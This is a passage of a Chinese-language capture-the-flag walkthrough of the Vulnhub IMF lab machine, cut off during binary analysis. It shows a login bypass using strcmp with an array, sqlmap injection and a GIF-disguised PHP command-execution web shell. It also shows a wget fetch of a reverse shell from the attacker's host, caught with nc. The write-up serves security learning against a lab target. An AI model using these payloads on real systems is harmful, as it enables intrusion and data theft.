--&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vendor/modernizr-2.6.2.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vendor/jquery-1.10.2.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/ZmxhZzJ7YVcxbVl.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/XUnRhVzVwYzNS.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/eVlYUnZjZz09fQ==.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">       <span class="hljs-keyword">new</span> WOW(</span><br><span class="javascript">          ).init();</span><br><span class="javascript">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯ base64 ï¼Œè¿›è¡Œè§£ç ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==</span><br><span class="hljs-string">===&gt;flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125;</span><br><span class="hljs-string">===&gt;imfadministrator</span><br></code></pre></td></tr></table></figure><p>è®¿é—® <code>192.168.135.146/imfadministrator</code> ï¼Œå‘ç°æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°æç¤ºï¼š</p><!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --><p>é€šè¿‡æ³¨é‡Šå¾—çŸ¥å¯†ç æ˜¯ç›´æ¥å†™åœ¨ php æ–‡ä»¶é‡Œçš„ã€‚çŒœæµ‹æ˜¯ä½¿ç”¨ strcmp ä¹‹ç±»çš„æ¥åˆ¤æ–­å¯†ç ã€‚å½“ strcmp çš„ä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ç›¸ç­‰çš„æ—¶å€™ä¼šè¿”å›0ï¼Œä½†å¦‚æœæŠŠ string å’Œ array ç›¸æ¯”è¾ƒçš„è¯ï¼Œstrcmp ä¹Ÿä¼šè¿”å› 0ã€‚</p><p>éšä¾¿å°è¯•å‡ ä¸ªç™»å½•ï¼Œå‡ºç° Invalid username. çš„æç¤ºï¼Œè¯´æ˜ç”¨æˆ·åå’Œå¯†ç æ˜¯åˆ†åˆ«éªŒè¯çš„ï¼Œè€Œä¸”å¯†ç æ˜¯å†™æ­»çš„ã€‚è¿™æ ·å°±å¯ä»¥å…ˆçˆ†ç ´ç”¨æˆ·åï¼Œåœ¨ç»•è¿‡å¯†ç éªŒè¯ã€‚</p><p>ä½¿ç”¨ cewl å¯¹ç«™ç‚¹ç”Ÿæˆå­—å…¸ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl 192.168.135.146 -w user.txt</span> <br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wc -l user.txt</span>                  <br>136 user.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sort user.txt -u -o user_unique.txt</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ burp è¿›è¡ŒæŠ“åŒ…ï¼Œé€šè¿‡ç”Ÿæˆçš„å­—å…¸å¯¹ user è¿›è¡Œçˆ†ç ´ã€‚</p><p>é€šè¿‡ç­›é€‰é•¿åº¦å¾—åˆ°æ­£ç¡®çš„ç”¨æˆ·åï¼šuser=rmichaels</p><p>å°† pass ä¼ å…¥ä¸€ä¸ªæ•°ç»„è¿›è¡Œç»•è¿‡ï¼ŒæˆåŠŸè¿›å…¥ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">POST</span> <span class="hljs-string">/imfadministrator/</span> <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-attr">Host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.135</span><span class="hljs-number">.146</span><br><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(X11;</span> <span class="hljs-string">Linux</span> <span class="hljs-string">x86_64;</span> <span class="hljs-string">rv:78.0)</span> <span class="hljs-string">Gecko/20100101</span> <span class="hljs-string">Firefox/78.0</span><br><span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">en-US,en;q=0.5</span><br><span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">21</span><br><span class="hljs-attr">Origin:</span> <span class="hljs-string">http://192.168.135.146</span><br><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><br><span class="hljs-attr">Referer:</span> <span class="hljs-string">http://192.168.135.146/imfadministrator/</span><br><span class="hljs-attr">Cookie:</span> <span class="hljs-string">PHPSESSID=8m3g812nee3t6fk5716apmos03</span><br><span class="hljs-attr">Upgrade-Insecure-Requests:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">user=admin&amp;pass[]=admin</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç¬¬ä¸‰ä¸ªæç¤ºï¼Œè¿›è¡Œè§£ç ï¼Œæç¤ºè¿›å…¥cmsã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">flag3&#123;Y29udGludWVUT2Ntcw==&#125;</span><br><span class="hljs-string">Welcome,</span> <span class="hljs-string">rmichaels</span><br><span class="hljs-string">IMF</span> <span class="hljs-string">CMS</span><br><br><span class="hljs-string">===&gt;continueTOcms</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥cmsåï¼Œå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œçœ‹åˆ°é¡µé¢é“¾æ¥æ˜¯å¸¦æœ‰å‚æ•°ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨SQLæ³¨å…¥ã€‚</p><p>éªŒè¯ä¸€ä¸‹ï¼Œé¡µé¢é“¾æ¥ååŠ ä¸ªå•å¼•å·ï¼Œé€šè¿‡æµ‹è¯•å¾—çŸ¥çš„ç¡®å­˜åœ¨SQLæ³¨å…¥ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">payload:</span> <span class="hljs-string">http://192.168.135.146/imfadministrator/cms.php?pagename=home&#x27;</span><br><br><span class="hljs-attr">Warning:</span> <span class="hljs-string">mysqli_fetch_row()</span> <span class="hljs-string">expects</span> <span class="hljs-string">parameter</span> <span class="hljs-number">1</span> <span class="hljs-string">to</span> <span class="hljs-string">be</span> <span class="hljs-string">mysqli_result,</span> <span class="hljs-string">boolean</span> <span class="hljs-string">given</span> <span class="hljs-string">in</span> <span class="hljs-string">/var/www/html/imfadministrator/cms.php</span> <span class="hljs-string">on</span> <span class="hljs-string">line</span> <span class="hljs-number">29</span><br></code></pre></td></tr></table></figure><p>sqlmap æ³¨å…¥ï¼š</p><blockquote><p>æ³¨æ„è¿™é‡Œæ˜¯åœ¨ç™»é™†æˆåŠŸä¹‹åæ‰æœ‰çš„æ³¨å…¥ç‚¹ï¼Œæ‰€ä»¥æ³¨å…¥æ—¶è¦å¸¦æœ‰ç™»é™†æˆåŠŸçš„ Cookieï¼ŒæŠŠå‰é¢çš„ burp æŠ“åˆ°çš„ cookie å¤åˆ¶ä¸‹æ¥ã€‚æˆ–è€…ç›´æ¥å°† burp æŠ“åˆ°çš„åŒ…ä¿å­˜ä¸ºæ–‡æœ¬æ–‡ä»¶ï¼Œé€šè¿‡ -r å‚æ•°ä½¿ç”¨ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&#x27;http://192.168.135.146/imfadministrator/cms.php?pagename=home&#x27;</span> --cookie <span class="hljs-string">&#x27;HPSESSID=8m3g812nee3t6fk5716apmos03&#x27;</span> --dump all</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sqlmap -r head.txt -dump</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸¤ä¸ªå›¾ç‰‡ï¼Œè®¿é—®å¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾—åˆ° flag4ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;img src=<span class="hljs-string">&quot;./images/whiteboard.jpg&quot;</span>&gt;<br>&lt;img src=<span class="hljs-string">&quot;./images/redacted.jpg&quot;</span>&gt;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">135.146</span><span class="hljs-regexp">/imfadministrator/im</span>ages/redacted.jpg<br>===&gt; null<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">135.146</span><span class="hljs-regexp">/imfadministrator/im</span>ages/whiteboard.jpg<br>===&gt; flag4&#123;dXBsb2Fkcjk0Mi5waHA=&#125; ===&gt; uploadr942.php<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.146/imfadministrator/uploadr942.php</code> ï¼Œå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç»æµ‹è¯•åªèƒ½ä¸Šä¼ å›¾ç‰‡ã€‚</p><p>æ„é€  gif æ–‡ä»¶æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$wzz</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wzz&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$wzz</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸä¸Šä¼ ï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶åã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">Intelligence Upload Form<br>File successfully uploaded. <br><br><span class="hljs-comment">&lt;!-- 6e8acf9700f3 --&gt;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®å‘ç°ä¸å­˜åœ¨ï¼ŒçŒœæµ‹å¯èƒ½ä¸Šä¼ åˆ°äº† uploads ç›®å½•ï¼ŒåŠ ä¸Šç›®å½•åæˆåŠŸè®¿é—®åˆ°ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif<br><span class="hljs-attribute">GIF89a</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ç”¨æˆ· id å’Œç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå‘ç° flag5 æ–‡ä»¶ï¼Œæ‰“å¼€æŸ¥çœ‹å¾—åˆ° flag5 ï¼Œè¿›è¡Œè§£å¯†å¾—åˆ° <strong>agentservices</strong>ï¼Œæç¤º agent æœåŠ¡ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=id<br><span class="hljs-attribute">GIF89a</span> uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data) <br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=ls<br><span class="hljs-attribute">GIF89a</span> <span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif flag<span class="hljs-number">5</span>_abc<span class="hljs-number">123</span>def.txt <br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=cat%<span class="hljs-number">20</span>flag<span class="hljs-number">5</span>_abc<span class="hljs-number">123</span>def.txt<br><span class="hljs-attribute">GIF89a</span> flag<span class="hljs-number">5</span>&#123;YWdlbnRzZXJ<span class="hljs-number">2</span>aWNlcw==&#125; <br></code></pre></td></tr></table></figure><p>ä¸ºæ–¹ä¾¿åé¢çš„æ“ä½œï¼Œå…ˆä¸Šä¼ ä¸€ä¸ª php reverse shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> æŸ¥æ‰¾ shell</span><br><span class="hljs-meta">$</span><span class="bash"> locate php-reverse-shell</span><br>/home/kali/Desktop/php-reverse-shell.php<br>/usr/share/laudanum/php/php-reverse-shell.php<br>/usr/share/laudanum/wordpress/templates/php-reverse-shell.php<br>/usr/share/webshells/php/php-reverse-shell.php<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/webshells/php/php-reverse-shell.php ./</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> ä¿®æ”¹ipå’Œport</span><br><span class="hljs-meta">$</span><span class="bash"> vim php-reverse-shell.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> é€šè¿‡ python å¼€å¯æœ¬åœ° http æœåŠ¡</span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> kali ç›‘å¬</span><br>nc -vlp 1234<br></code></pre></td></tr></table></figure><p>åœ¨åˆšåˆšè·å–çš„ä½æƒé™ç”¨æˆ·ä¸­è·å– shellï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/6e8acf9700f3.gif?wzz=wget</span> <span class="hljs-string">http://192.168.135.141:8888/php-reverse-shell.php</span><br><br><span class="hljs-comment"># æŸ¥çœ‹ï¼ŒæˆåŠŸä¸Šä¼ </span><br><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/6e8acf9700f3.gif?wzz=ls</span><br><span class="hljs-string">GIF89a</span> <span class="hljs-string">6e8acf9700f3.gif</span> <span class="hljs-string">flag5_abc123def.txt</span> <span class="hljs-string">php-reverse-shell.php</span> <br><br><span class="hljs-comment"># è®¿é—®</span><br><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/php-reverse-shell.php</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -vlp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from 192.168.135.146 [192.168.135.146] 43812<br>Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux<br> 21:14:54 up  8:38,  0 users,  load average: 0.03, 0.01, 0.06<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br></code></pre></td></tr></table></figure><p>è¿æ¥ä¹‹åæ ¹æ®æç¤ºæŸ¥æ‰¾å« agent çš„æœåŠ¡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> whereis agent</span><br>agent: /usr/local/bin/agent<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /usr/<span class="hljs-built_in">local</span>/bin</span>      <br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>access_codes<br>agent<br><span class="hljs-meta">$</span><span class="bash"> cat access_codes</span><br>SYN 7482,8279,9467<br></code></pre></td></tr></table></figure><p>çœ‹èµ·æ¥åƒæ˜¯è¿è¡Œäº† knock ã€‚å…ˆæŒ‰é¡ºåºæ‰«æè¿™ä¸‰ä¸ªç«¯å£ï¼Œå†é‡æ–°æ‰«æä¸€éé¶æœºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -p7482,8279,9467 192.168.135.146</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-04 21:12 EDT<br>Nmap scan report for 192.168.135.146 (192.168.135.146)<br>Host is up (0.0027s latency).<br><br>PORT     STATE    SERVICE<br>7482/tcp filtered unknown<br>8279/tcp filtered unknown<br>9467/tcp filtered unknown<br><br>Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -p- 192.168.135.146</span>          <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-04 22:29 EDT<br>Nmap scan report for 192.168.135.146 (192.168.135.146)<br>Host is up (0.0028s latency).<br>Not shown: 65533 filtered ports<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7788/tcp open  unknown<br><br>Nmap done: 1 IP address (1 host up) scanned in 105.55 seconds<br></code></pre></td></tr></table></figure><p>å‘ç°æ–°å¼€äº†7788ç«¯å£ï¼Œè¿æ¥ç«¯å£å‘ç°æ˜¯è¿è¡Œç€ agent ç¨‹åºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc 192.168.135.146 7788</span>                  <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 123<br>Invalid Agent ID <br></code></pre></td></tr></table></figure><p>ä¸ºæ–¹ä¾¿ä¸‹è½½ï¼Œå°†ç¨‹åºç§»åŠ¨åˆ° uploads ç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cp /usr/<span class="hljs-built_in">local</span>/bin/agent /var/www/html/imfadministrator/uploads</span><br></code></pre></td></tr></table></figure><p>kali ä¸‹è½½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.146/imfadministrator/uploads/agent</span><br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><blockquote><p>é€šè¿‡æ ˆæº¢å‡ºè¿›è¡Œææƒã€‚</p><p>å‚è€ƒï¼š<a href="http://cn-sec.com/archives/555761.html">vulnhub_IMFç¼“å†²åŒºæº¢å‡ºè¯¦è§£ | CN-SEC ä¸­æ–‡ç½‘</a></p><p>ç¬¬äºŒç§æ–¹æ³•ï¼šcve-2021-4034ï¼ˆé€šæ€æ¼æ´ï¼Œ202112å‘ç°ï¼Œ2022-3-15è¢«cveè®°å½•ï¼‰</p></blockquote><h3 id="1ã€æŸ¥çœ‹æ–‡ä»¶ä¿æŠ¤"><a href="#1ã€æŸ¥çœ‹æ–‡ä»¶ä¿æŠ¤" class="headerlink" title="1ã€æŸ¥çœ‹æ–‡ä»¶ä¿æŠ¤"></a>1ã€æŸ¥çœ‹æ–‡ä»¶ä¿æŠ¤</h3><p><strong>ä½¿ç”¨ file å’Œ checksec æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å’Œä¿æŠ¤æªæ–½ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file agent</span><br>agent: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped<br><span class="hljs-meta">$</span><span class="bash"> checksec agent</span><br>[*] &#x27;/home/pwn/æ¡Œé¢/agent&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶åŸºæœ¬ä¿¡æ¯ï¼š32 ä½ã€å°ç«¯åºã€åŠ¨æ€é“¾æ¥ç¨‹åºï¼Œä¸”å­˜åœ¨<strong>å¯è¯»å¯å†™å¯æ‰§è¡Œæ®µ</strong> ã€‚</p><h3 id="2ã€ä¼ªä»£ç åˆ†æ"><a href="#2ã€ä¼ªä»£ç åˆ†æ" class="headerlink" title="2ã€ä¼ªä»£ç åˆ†æ"></a>2ã€ä¼ªä»£ç åˆ†æ</h3><p>å°† agent æ–‡ä»¶æ‹–å…¥ 32 ä½çš„ IDA ä¸­è¿›è¡Œåˆ†æï¼ŒæŒ‰ <code>shift+f12</code> æ²¡æ‰¾åˆ° <code>system(&#39;/bin/sh&#39;)</code> ç›¸å…³å†…å®¹ã€‚</p><p>æŒ‰ F5 æŸ¥çœ‹ä¼ªä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> *s2; <span class="hljs-comment">// [esp+8h] [ebp-20h]</span><br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Eh] [ebp-1Ah]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [esp+1Fh] [ebp-9h]</span><br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  asprintf(&amp;s2, <span class="hljs-string">&quot;%i&quot;</span>, <span class="hljs-number">48093572</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  ___ __  __ ___ &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span 